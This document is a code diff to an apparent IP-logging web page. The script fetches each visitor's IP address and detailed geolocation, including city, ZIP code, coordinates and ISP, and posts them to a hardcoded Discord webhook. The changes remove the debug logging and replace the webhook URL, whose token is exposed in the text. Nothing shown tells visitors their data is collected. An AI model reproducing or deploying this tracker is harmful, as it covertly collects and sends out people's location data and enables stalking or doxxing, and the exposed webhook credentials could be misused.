@@ -8,18 +8,14 @@
         // Function to get the user's IP address and location
         async function getIPandLocation() {
             try {
-                console.log('Fetching IP address...');
                 // Fetch the IP address
                 let ipResponse = await fetch('https://api.ipify.org?format=json');
                 let ipData = await ipResponse.json();
                 let ip = ipData.ip;
-                console.log('IP address fetched:', ip);
 
                 // Fetch the geolocation data using ip-api.com
-                console.log('Fetching location data...');
                 let locationResponse = await fetch(`http://ip-api.com/json/${ip}`);
                 let locationData = await locationResponse.json();
-                console.log('Location data fetched:', locationData);
 
                 // Check status to ensure successful API call
                 if (locationData.status !== 'success') {
@@ -35,7 +31,13 @@
 
         // Function to send the IP address and location to a Discord webhook
         async function sendToDiscord(data) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1266889183943987321/oDW3IA3FDUMxvAlrRhj5c1f7xfTmSP6sTOBFCQUtaFAS_TwdGNQBLs0oMHbGyfamXVL_'; // Replace with your Discord webhook URL
+            const webhookUrl = 'https://discord.com/api/webhooks/1267728048829108365/K3YnLVDarqgR0T_tU0Vc27nuNP7GMVLC3qpKoEPt6X2subgQaBlDkpjUxo9RciNb9xlO'; // Replace with your Discord webhook URL
+
+            if (!data) {
+                console.error('No data to send to Discord');
+                return;
+            }
+
             const location = data.location || {};
 
             const payload = {
@@ -51,15 +53,15 @@
                             {
                                 name: "Location:",
                                 value: 
-                                     `Country:\n${location.country || 'N/A'}\n\n` +
-                                       `Region:\n${location.regionName || 'N/A'}\n\n` +
-                                       `City:\n${location.city || 'N/A'}\n\n` +
-                                       `ZIP:\n${location.zip || 'N/A'}\n\n` +
-                                       `Latitude:\n${location.lat || 'N/A'}\n\n` +
-                                       `Longitude:\n${location.lon || 'N/A'}\n\n` +
-                                       `ISP:\n${location.isp || 'N/A'}\n\n` +
-                                       `Organization:\n${location.org || 'N/A'}\n\n` +
-                                       `AS:\n${location.as || 'N/A'}\n\n`
+                                    `Country:\n${location.country || 'N/A'}\n\n` +
+                                    `Region:\n${location.regionName || 'N/A'}\n\n` +
+                                    `City:\n${location.city || 'N/A'}\n\n` +
+                                    `ZIP:\n${location.zip || 'N/A'}\n\n` +
+                                    `Latitude:\n${location.lat || 'N/A'}\n\n` +
+                                    `Longitude:\n${location.lon || 'N/A'}\n\n` +
+                                    `ISP:\n${location.isp || 'N/A'}\n\n` +
+                                    `Organization:\n${location.org || 'N/A'}\n\n` +
+                                    `AS:\n${location.as || 'N/A'}\n\n`
                             }
                         ],
                         author: {
@@ -71,16 +73,14 @@
             };
 
             try {
-                console.log('Sending data to Discord:', payload);
-                const response = await fetch(webhookUrl, {
+                await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(payload)
                 });
-                const result = await response.json();
-                console.log('Response from Discord:', result);
+                console.log('Data sent to Discord successfully');
             } catch (error) {
                 console.error('Error sending to Discord:', error);
             }
